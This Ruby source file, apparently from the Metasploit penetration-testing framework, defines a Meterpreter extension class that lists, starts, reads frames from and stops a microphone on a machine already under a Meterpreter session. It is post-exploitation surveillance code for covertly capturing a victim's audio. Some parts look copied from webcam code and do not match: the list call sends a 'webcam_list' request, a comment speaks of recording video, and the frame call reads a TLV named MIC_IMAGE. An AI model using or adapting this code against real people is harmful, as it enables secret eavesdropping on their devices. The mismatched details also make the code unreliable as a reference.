# -*- coding: binary -*-

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Stdapi
          module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
            class Mic
              include Msf::Post::Common

              def initialize(client)
                @client = client
              end

              def session
                @client
              end

              def mic_list
                response = client.send_request(Packet.create_request('webcam_list'))
                names = []
                response.get_tlvs(TLV_TYPE_MIC_NAME).each do |tlv|
                  names << tlv.value
                end
                names
              end

              # Starts recording video from video source of index +cam+
              def mic_start(cam)
                request = Packet.create_request('mic_start')
                request.add_tlv(TLV_TYPE_MIC_INTERFACE_ID, cam)
                client.send_request(request)
                true
              end

              def mic_get_frame(quality)
                request = Packet.create_request('mic_get_frame')
                request.add_tlv(TLV_TYPE_MIC_QUALITY, quality)
                response = client.send_request(request)
                response.get_tlv(TLV_TYPE_MIC_IMAGE).value
              end

              def mic_stop
                client.send_request(Packet.create_request('mic_stop'))
                true
              end

              attr_accessor :client
            end
          end
        end
      end
    end
  end
end
